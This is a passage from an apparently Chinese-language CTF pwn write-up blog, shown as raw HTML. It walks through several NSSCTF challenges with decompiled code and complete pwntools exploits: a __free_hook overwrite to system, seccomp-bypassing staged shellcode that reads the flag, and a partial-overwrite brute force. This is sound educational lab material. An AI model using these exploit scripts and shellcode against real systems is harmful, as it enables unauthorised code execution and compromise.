class="params">idx,size,content</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input your idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    s(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input your idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input your idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>,<span class="string">&quot;N1ght&quot;</span>,<span class="string">&quot;TestAAA&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&quot;AAA&quot;</span>,<span class="string">&quot;BBB&quot;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x31</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x18</span> + p64(<span class="number">0x31</span>) + <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;\x80&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">puts_addr = get_addr()</span><br><span class="line">success(<span class="string">&quot;puts_addr: &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(puts_addr))</span><br><span class="line"><span class="comment"># rl(&quot;AAAAAAAAAAAAAAAA&quot;)</span></span><br><span class="line"><span class="comment"># second_heap = u64(p.recvuntil(&quot;\n&quot;,drop=True).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># success(&quot;second_heap: &#123;:#x&#125;&quot;.format(second_heap))</span></span><br><span class="line"><span class="comment"># edit(1,0x50,b&quot;A&quot;*0x18 + p64(0x31) + b&quot;A&quot;*0x28)</span></span><br><span class="line"><span class="comment"># show(2)</span></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="number">0x18</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x31</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(free_hook))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x40</span>,p64(system))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<h3 id="GDOUCTF-2023-Random"><a href="#GDOUCTF-2023-Random" class="headerlink" title="[GDOUCTF 2023]Random"></a>[GDOUCTF 2023]Random</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v12 = <span class="number">100</span>;</span><br><span class="line">  sandbox((__int64)v3, <span class="number">0LL</span>, v4, v5, v6, v7);</span><br><span class="line">  v8 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v8);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v12; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = rand() % <span class="number">50</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input a guess num:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v10) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getchar() != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v11 == v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;good guys&quot;</span>);</span><br><span class="line">      vulnerable();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no,no,no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your door&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sandbox</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  __int16 v8; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+12h] [rbp-2Eh]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+13h] [rbp-2Dh]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  __int16 v12; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+1Ah] [rbp-26h]</span></span><br><span class="line">  <span class="type">char</span> v14; <span class="comment">// [rsp+1Bh] [rbp-25h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  __int16 v16; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+22h] [rbp-1Eh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [rsp+23h] [rbp-1Dh]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int16 v20; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [rsp+2Ah] [rbp-16h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [rsp+2Bh] [rbp-15h]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int16 v24; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [rsp+32h] [rbp-Eh]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [rsp+33h] [rbp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int16 v28; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  <span class="type">char</span> v29; <span class="comment">// [rsp+3Ah] [rbp-6h]</span></span><br><span class="line">  <span class="type">char</span> v30; <span class="comment">// [rsp+3Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [rsp+3Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="number">32</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">4</span>;</span><br><span class="line">  v12 = <span class="number">21</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">2</span>;</span><br><span class="line">  v15 = <span class="number">-1073741762</span>;</span><br><span class="line">  v16 = <span class="number">32</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  v18 = <span class="number">0</span>;</span><br><span class="line">  v19 = <span class="number">0</span>;</span><br><span class="line">  v20 = <span class="number">21</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">1</span>;</span><br><span class="line">  v23 = <span class="number">59</span>;</span><br><span class="line">  v24 = <span class="number">6</span>;</span><br><span class="line">  v25 = <span class="number">0</span>;</span><br><span class="line">  v26 = <span class="number">0</span>;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  v28 = <span class="number">6</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">2147418112</span>;</span><br><span class="line">  LOWORD(v7) = <span class="number">6</span>;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, a6, v7, &amp;v8);</span><br><span class="line">  <span class="keyword">return</span> prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v7);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现有sandbox使用seccomp-tools查看</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241112221758-1ku4us9.png" alt="image">​</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241112222703-qbrvjdh.png" alt="image">​</p>
<p>栈可执行</p>
<p>由于可控空间太小，栈可执行，修改rax和rdi为0，然后修改rdx为0x100，然后rsi添加0x100调用syscall。</p>
<p>由于read的时候rsi为栈中buf的值，所以我们call rsi即可返回buf里，然后执行<code>xor rax, rax; xor rdi, rdi; push 0x100; pop rdx; add rsi, 0x100; syscall; call rsi;</code>​读取一段汇编到rsi里面，然后调用rsi里的代码</p>
<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241112223602-wd6l2zr.png" alt="image">​</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    ip = <span class="string">&quot;node5.anna.nssctf.cn&quot;</span></span><br><span class="line">    port = <span class="number">20846</span></span><br><span class="line">    p = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;./libc-2.23-x64.so&#x27;)</span></span><br><span class="line">clibc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">ret = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">rdi = rop.find_gadget([<span class="string">&#x27;pop rdi&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">info(<span class="string">&quot;ret addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(ret))</span><br><span class="line">info(<span class="string">&quot;rdi addr : &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(rdi))</span><br><span class="line">v3 = clibc.time(<span class="number">0</span>)</span><br><span class="line">v4 = clibc.srand(v3)</span><br><span class="line">v5 = clibc.rand() % <span class="number">50</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(v5)</span><br><span class="line">sl(<span class="built_in">str</span>(v5))</span><br><span class="line">offset = <span class="number">0x20</span> + <span class="number">8</span></span><br><span class="line">shellcode = asm(<span class="string">&#x27;xor rax, rax; xor rdi, rdi; push 0x100; pop rdx; add rsi, 0x100; syscall; call rsi;&#x27;</span>)</span><br><span class="line">orw_shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>) + shellcraft.read(<span class="string">&#x27;rax&#x27;</span>, elf.bss() + <span class="number">0x100</span>, <span class="number">0x30</span>) + shellcraft.write(<span class="number">1</span>, elf.bss() + <span class="number">0x100</span>, <span class="number">0x30</span>))</span><br><span class="line">call_rsi = <span class="number">0x0000000000400c23</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sa(<span class="string">b&#x27;door\n&#x27;</span>, shellcode.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(call_rsi))</span><br><span class="line">s(orw_shellcode)</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>

<p>应该好好学习orw的，这个地方就有点懵了</p>
<h2 id="11-13"><a href="#11-13" class="headerlink" title="11.13"></a>11.13</h2><h3 id="UUCTF-2022-新生赛-easystack"><a href="#UUCTF-2022-新生赛-easystack" class="headerlink" title="[UUCTF 2022 新生赛]easystack"></a>[UUCTF 2022 新生赛]easystack</h3><p>开启了PIE和NX</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/pwn/nssctf/11.13/UUCTF_2022_新生赛_easystack/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I am back! Can you beat me this time?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10A</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现就溢出了10字节，可以覆盖掉ebp和ret的后两个字节</p>
<p>栈上的 partial overwrite</p>
<p>后门的后两个字节为<code>0000000000001185</code>​</p>
<p>所以可以爆破</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>) : p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>) : p.sendafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>) : p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>) : p.sendlineafter(a, b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>() : <span class="keyword">return</span> p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pr</span>() : <span class="built_in">print</span>(p.recv())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>) : <span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>() : p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>() : <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, rip, gadget</span>) : <span class="keyword">return</span> p64(gadget) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rip) + p64(rdi) + p64(rsi) + p64(rdx) + p64(gadget - <span class="number">0x1a</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_32_addr</span>():	<span class="keyword">return</span> u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    offset = <span class="number">0x100</span> + <span class="number">8</span></span><br><span class="line">    payload = cyclic(offset) + <span class="string">b&#x27;\x85\x11&#x27;</span></span><br><span class="line">    sl(payload)</span><br><span class="line">    r()</span><br><span class="line">    sl(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;uid&quot;</span> <span class="keyword">in</span> r():</span><br><span class="line">        inter()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> args[<span class="string">&#x27;DEBUG&#x27;</span>]:</span><br><span class="line">            context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">            ip = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">            port = <span class="number">1111</span></span><br><span class="line">            p = remote(ip, port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">            info(<span class="string">&quot;pid: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(p.pid))</span><br><span class="line">        elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>

<p>​<img src="https://raw.githubusercontent.com/yezere/images/master/image-20241113093933-x7vj42h.png" alt="image">​</p>
<p>爆破成功</p>
<h3 id="HDCTF-2023-Makewish"><a href="#HDCTF-2023-Makewish" class="headerlink" title="[HDCTF 2023]Makewish"></a>[HDCTF 2023]Makewish</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp.py     </span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 19701</span><br><span class="line">[*] pid: 19701</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/pwn/nssctf/11.13/HDCTF_2023_Makewish/pwn&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span 